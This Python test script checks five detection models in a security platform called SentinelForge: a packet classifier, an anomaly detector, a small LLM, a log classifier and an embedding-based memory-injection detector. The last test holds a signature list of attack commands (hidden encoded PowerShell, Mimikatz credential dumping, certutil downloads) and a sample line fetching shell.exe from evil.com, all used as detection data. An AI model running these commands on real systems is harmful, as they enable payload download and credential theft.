#!/usr/bin/env python3
"""
SentinelForge — AI/ML Model Retest Suite
Tests all 5 AI models used in the platform and generates a comprehensive report.
"""

import sys
import os
import time
import json
import traceback
import platform
from datetime import datetime

# Ensure backend modules are importable
sys.path.insert(0, os.path.dirname(__file__))

# ============================
# RESULTS COLLECTOR
# ============================
results = {}

def run_test(model_name, test_fn):
    """Wrapper to run a test function, capture time and exceptions."""
    print(f"\n{'='*60}")
    print(f"  TESTING: {model_name}")
    print(f"{'='*60}")
    start = time.time()
    try:
        result = test_fn()
        elapsed = time.time() - start
        result["latency_seconds"] = round(elapsed, 3)
        result["status"] = "PASS"
        print(f"  ✅ {model_name}: PASSED ({elapsed:.3f}s)")
    except Exception as e:
        elapsed = time.time() - start
        result = {
            "status": "FAIL",
            "error": str(e),
            "traceback": traceback.format_exc(),
            "latency_seconds": round(elapsed, 3)
        }
        print(f"  ❌ {model_name}: FAILED ({elapsed:.3f}s) — {e}")
    results[model_name] = result


# ============================
# TEST 1: PyTorch ThreatDetector
# ============================
def test_pytorch_threat_detector():
    import torch
    from models.threat_detector import ThreatDetector

    detector = ThreatDetector()
    
    # Health check
    health = detector.perform_health_check()
    
    # Test with synthetic packets (benign and malicious)
    test_packets = [
        # Benign: Normal HTTPS traffic from US
        {"packet_id": "test_1", "size": 512, "protocol": "TCP", "source_ip": "8.8.8.8", "dest_ip": "192.168.1.1", "port": 443, "geo": "US"},
        # Suspicious: SSH from high-risk country
        {"packet_id": "test_2", "size": 64, "protocol": "TCP", "source_ip": "203.0.113.1", "dest_ip": "192.168.1.1", "port": 22, "geo": "RU"},
        # Suspicious: RDP from North Korea
        {"packet_id": "test_3", "size": 1400, "protocol": "TCP", "source_ip": "175.45.176.1", "dest_ip": "192.168.1.5", "port": 3389, "geo": "KP"},
        # Benign: DNS lookup
        {"packet_id": "test_4", "size": 64, "protocol": "UDP", "source_ip": "1.1.1.1", "dest_ip": "192.168.1.1", "port": 53, "geo": "US"},
        # Suspicious: Telnet from Iran
        {"packet_id": "test_5", "size": 128, "protocol": "TCP", "source_ip": "5.160.0.1", "dest_ip": "192.168.1.1", "port": 23, "geo": "IR"},
        # Benign: HTTP from Germany
        {"packet_id": "test_6", "size": 1200, "protocol": "TCP", "source_ip": "85.214.0.1", "dest_ip": "192.168.1.1", "port": 80, "geo": "DE"},
        # Suspicious: ICMP from China
        {"packet_id": "test_7", "size": 56, "protocol": "ICMP", "source_ip": "220.181.0.1", "dest_ip": "192.168.1.1", "port": 0, "geo": "CN"},
        # Benign: Local traffic
        {"packet_id": "test_8", "size": 300, "protocol": "TCP", "source_ip": "192.168.1.10", "dest_ip": "192.168.1.1", "port": 8080, "geo": "LOCAL"},
    ]
    
    analysis_results = detector.process_packet_analysis(test_packets, threshold_override=0.5)
    
    # Test suspicious packet deep analysis
    suspicious = [r for r in analysis_results if r["is_threat"]]
    deep_results = detector.analyze_suspicious_packets([
        {"packet_id": s["packet_id"], "risk_score": s["threat_probability"]} for s in suspicious
    ])
    
    # Model architecture info
    param_count = sum(p.numel() for p in detector.model.parameters())
    
    return {
        "model": "ThreatDetectorModel (PyTorch MLP)",
        "framework": f"PyTorch {torch.__version__}",
        "architecture": "Linear(5→16) → ReLU → Linear(16→1) → Sigmoid",
        "parameters": param_count,
        "health_check": "PASS" if health else "FAIL",
        "test_packets": len(test_packets),
        "threats_detected": len(suspicious),
        "threat_rate": f"{len(suspicious)}/{len(test_packets)} ({100*len(suspicious)/len(test_packets):.0f}%)",
        "deep_analysis_actions": [d["action"] for d in deep_results],
        "packet_results": [
            {"id": r["packet_id"], "probability": round(r["threat_probability"], 4), "is_threat": r["is_threat"]}
            for r in analysis_results
        ],
    }


# ============================
# TEST 2: Scikit-learn IsolationForest
# ============================
def test_isolation_forest():
    import numpy as np
    from sklearn.ensemble import IsolationForest
    
    # Recreate the model as used in NetworkModel
    model = IsolationForest(contamination=0.05, random_state=42)
    
    # Generate synthetic normal traffic data (1000 samples)
    np.random.seed(42)
    normal_traffic = np.random.normal(loc=[500, 0.5, 0.1, 0.1, 0.2], scale=[200, 0.2, 0.05, 0.05, 0.1], size=(1000, 5))
    normal_traffic = np.clip(normal_traffic, 0, 1500)
    
    # Fit the model
    model.fit(normal_traffic)
    
    # Create test data: mix of normal and anomalous
    test_normal = np.random.normal(loc=[500, 0.5, 0.1, 0.1, 0.2], scale=[200, 0.2, 0.05, 0.05, 0.1], size=(20, 5))
    test_anomalous = np.array([
        [1500, 1.0, 1.0, 1.0, 0.9],   # DDoS-like burst
        [1400, 1.0, 1.0, 1.0, 0.95],   # Another DDoS burst
        [10, 0.0, 0.0, 1.0, 0.01],     # Tiny probe from high-risk
        [1500, 1.0, 1.0, 1.0, 0.85],   # Sustained flood
        [5, 0.2, 1.0, 1.0, 0.99],      # Micro-packet reconnaissance
    ])
    test_data = np.vstack([test_normal, test_anomalous])
    
    predictions = model.predict(test_data)
    scores = model.decision_function(test_data)

    normal_correct = sum(1 for p in predictions[:20] if p == 1)
    anomaly_detected = sum(1 for p in predictions[20:] if p == -1)

    return {
        "model": "IsolationForest (Scikit-learn)",
        "framework": f"scikit-learn",
        "contamination_rate": 0.05,
        "training_samples": 1000,
        "feature_dimensions": 5,
        "features": ["Packet Size", "Protocol", "Port Risk", "Geo Risk", "Timing"],
        "test_normal_samples": 20,
        "test_anomalous_samples": 5,
        "normal_correct": f"{normal_correct}/20 ({100*normal_correct/20:.0f}%)",
        "anomalies_detected": f"{anomaly_detected}/5 ({100*anomaly_detected/5:.0f}%)",
        "avg_normal_score": round(float(np.mean(scores[:20])), 4),
        "avg_anomaly_score": round(float(np.mean(scores[20:])), 4),
        "verdict": "PASS" if anomaly_detected >= 3 else "MARGINAL",
    }


# ============================
# TEST 3: HuggingFace SmolLM-135M (Generative SOC LLM)
# ============================
def test_soc_llm():
    from models.soc_llm import SOCSupervisorLLM
    
    llm = SOCSupervisorLLM()
    llm._load_model()  # Synchronous load
    
    # Test 1: Threat Correlation
    test_threats = [
        {"time": time.time(), "model": "NET", "geo": "RU"},
        {"time": time.time(), "model": "MEM", "geo": "CN"},
        {"time": time.time(), "model": "WEB", "geo": "KP"},
    ]
    
    start = time.time()
    correlation_result = llm.correlate_threats(test_threats)
    correlation_latency = time.time() - start
    
    # Test 2: Admin Query
    start = time.time()
    query_result = llm.answer_admin_query("What is the current threat level?")
    query_latency = time.time() - start
    
    # Test 3: Heuristic fallback (single model)
    single_threat = [{"time": time.time(), "model": "NET", "geo": "US"}]
    heuristic_result = llm.correlate_threats(single_threat)
    
    return {
        "model": "SmolLM-135M (HuggingFace Transformers)",
        "framework": "HuggingFace Transformers",
        "model_id": "HuggingFaceTB/SmolLM-135M",
        "parameters": "135 Million",
        "device": "CPU",
        "is_loaded": llm.is_loaded,
        "max_new_tokens": 60,
        "correlation_test": {
            "input": f"{len(test_threats)} threats from {', '.join([t['model'] for t in test_threats])}",
            "output_preview": correlation_result[:200] + "..." if len(correlation_result) > 200 else correlation_result,
            "output_length": len(correlation_result),
            "latency_seconds": round(correlation_latency, 3),
            "uses_generative": "[Generative LLM" in correlation_result,
        },
        "admin_query_test": {
            "query": "What is the current threat level?",
            "response_preview": query_result[:200] + "..." if len(query_result) > 200 else query_result,
            "latency_seconds": round(query_latency, 3),
        },
        "heuristic_fallback_test": {
            "output_preview": heuristic_result[:200],
            "uses_heuristic": "[Heuristic" in heuristic_result,
        },
    }


# ============================
# TEST 4: DistilBERT NLP Classifier
# ============================
def test_distilbert_nlp():
    try:
        from transformers import pipeline
    except ImportError:
        return {
            "model": "DistilBERT (HuggingFace Transformers)",
            "status": "SKIP",
            "reason": "transformers library not installed",
        }
    
    nlp = pipeline("text-classification", model="distilbert-base-uncased-finetuned-sst-2-english")
    
    # Test with real auth log entries (mix of benign and malicious patterns)
    test_entries = [
        # Malicious patterns (should classify as NEGATIVE)
        ("Failed password for root from 203.0.113.5 port 22 ssh2", True),
        ("Invalid user admin from 198.51.100.10 port 22", True),
        ("COMMAND=/bin/bash sudo su - root", True),
        ("Failed password for invalid user test from 185.176.43.2 port 22", True),
        ("sudo: 3 incorrect password attempts for user admin", True),
        # Benign patterns (should classify as POSITIVE)
        ("Accepted publickey for deploy from 10.0.0.5 port 22 ssh2", False),
        ("session opened for user admin by (uid=0)", False),
        ("System boot completed successfully", False),
    ]
    
    correct = 0
    test_results = []
    total_latency = 0
    
    for log_entry, is_malicious in test_entries:
        start = time.time()
        result = nlp(log_entry)[0]
        latency = time.time() - start
        total_latency += latency
        
        predicted_malicious = result["label"] == "NEGATIVE" and result["score"] > 0.8
        is_correct = predicted_malicious == is_malicious
        if is_correct:
            correct += 1
        
        test_results.append({
            "input": log_entry[:60] + "..." if len(log_entry) > 60 else log_entry,
            "expected": "MALICIOUS" if is_malicious else "BENIGN",
            "predicted": result["label"],
            "confidence": round(result["score"], 4),
            "correct": is_correct,
        })
    
    return {
        "model": "DistilBERT-base-uncased-finetuned-SST2 (HuggingFace)",
        "framework": "HuggingFace Transformers",
        "task": "text-classification (sentiment as security proxy)",
        "parameters": "~66 Million",
        "threshold": "NEGATIVE label + confidence > 0.80",
        "test_entries": len(test_entries),
        "accuracy": f"{correct}/{len(test_entries)} ({100*correct/len(test_entries):.0f}%)",
        "avg_latency_per_entry": round(total_latency / len(test_entries), 4),
        "detailed_results": test_results,
    }


# ============================
# TEST 5: FastEmbed BGE-small (Memory Injection Detection)
# ============================
def test_fastembed_bge():
    import numpy as np
    from fastembed import TextEmbedding
    
    model = TextEmbedding(model_name="BAAI/bge-small-en-v1.5")
    
    # Known malicious signatures (from MemoryModel)
    malicious_signatures = [
        "powershell.exe -nop -w hidden -encodedcommand",
        "svchost.exe -k netsvcs (Process Hollowing Target)",
        "Invoke-Mimikatz -DumpCreds",
        "Reflective DLL Injection memory pattern MZ...PE...0x00",
        "Cobalt Strike Beacon HTTP payload pattern",
        "rundll32.exe C:\\windows\\temp\\malicious.dll",
        "certutil.exe -urlcache -split -f http://"
    ]
    
    # Compute signature embeddings
    sig_embeddings = np.array(list(model.embed(malicious_signatures)))
    
    def cosine_similarity(a, b):
        return np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b))
    
    # Test processes (mix of benign and malicious-looking)
    test_processes = [
        # Should match (malicious)
        ("powershell.exe -nop -windowstyle hidden -encodedcommand ZABvAHcAbgBsAG8", True),
        ("rundll32.exe C:\\temp\\payload.dll entry_point", True),
        ("certutil.exe -urlcache -f http://evil.com/shell.exe", True),
        # Should NOT match (benign)
        ("/usr/bin/python3 manage.py runserver", False),
        ("Google Chrome --type=renderer --field-trial-handle", False),
        ("node /usr/local/bin/npm run dev", False),
        ("vim /etc/nginx/nginx.conf", False),
        ("/usr/sbin/sshd -D", False),
    ]
    
    threshold = 0.82
    correct = 0
    scan_results = []
    total_latency = 0
    
    for proc_cmdline, is_malicious in test_processes:
        start = time.time()
        live_emb = list(model.embed([proc_cmdline]))[0]
        similarities = [cosine_similarity(live_emb, sig_emb) for sig_emb in sig_embeddings]
        max_sim = max(similarities)
        matched_idx = similarities.index(max_sim)
        latency = time.time() - start
        total_latency += latency
        
        predicted_malicious = max_sim > threshold
        is_correct = predicted_malicious == is_malicious
        if is_correct:
            correct += 1
        
        scan_results.append({
            "process": proc_cmdline[:60] + "..." if len(proc_cmdline) > 60 else proc_cmdline,
            "expected": "MALICIOUS" if is_malicious else "BENIGN",
            "max_similarity": round(float(max_sim), 4),
            "matched_signature": malicious_signatures[matched_idx][:50] + "..." if predicted_malicious else "N/A",
            "predicted": "MALICIOUS" if predicted_malicious else "BENIGN",
            "correct": is_correct,
        })
    
    return {
        "model": "BAAI/bge-small-en-v1.5 (FastEmbed)",
        "framework": "FastEmbed (ONNX Runtime)",
        "embedding_dimensions": 384,
        "task": "Semantic similarity for memory injection detection",
        "signature_count": len(malicious_signatures),
        "similarity_threshold": threshold,
        "test_processes": len(test_processes),
        "accuracy": f"{correct}/{len(test_processes)} ({100*correct/len(test_processes):.0f}%)",
        "avg_latency_per_process": round(total_latency / len(test_processes), 4),
        "detailed_results": scan_results,
    }


# ============================
# MAIN RUNNER
# ============================
if __name__ == "__main__":
    print("\n" + "="*60)
    print("  SENTINELFORGE AI/ML MODEL RETEST SUITE")
    print(f"  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  Platform: {platform.system()} {platform.machine()}")
    print(f"  Python: {sys.version.split()[0]}")
    print("="*60)
    
    overall_start = time.time()
    
    run_test("PyTorch ThreatDetector", test_pytorch_threat_detector)
    run_test("Scikit-learn IsolationForest", test_isolation_forest)
    run_test("HuggingFace SmolLM-135M", test_soc_llm)
    run_test("DistilBERT NLP Classifier", test_distilbert_nlp)
    run_test("FastEmbed BGE-small", test_fastembed_bge)
    
    overall_elapsed = time.time() - overall_start
    
    # Summary
    passed = sum(1 for r in results.values() if r.get("status") == "PASS")
    failed = sum(1 for r in results.values() if r.get("status") == "FAIL")
    
    print(f"\n{'='*60}")
    print(f"  FINAL RESULTS: {passed} PASSED / {failed} FAILED / {len(results)} TOTAL")
    print(f"  Total Test Time: {overall_elapsed:.2f}s")
    print(f"{'='*60}")
    
    # Save JSON results for the report generator
    output = {
        "test_date": datetime.now().isoformat(),
        "platform": f"{platform.system()} {platform.machine()}",
        "python_version": sys.version.split()[0],
        "total_time_seconds": round(overall_elapsed, 2),
        "summary": {"passed": passed, "failed": failed, "total": len(results)},
        "models": results,
    }
    
    with open("model_test_results.json", "w") as f:
        json.dump(output, f, indent=2, default=str)
    
    print(f"\n  Results saved to model_test_results.json")
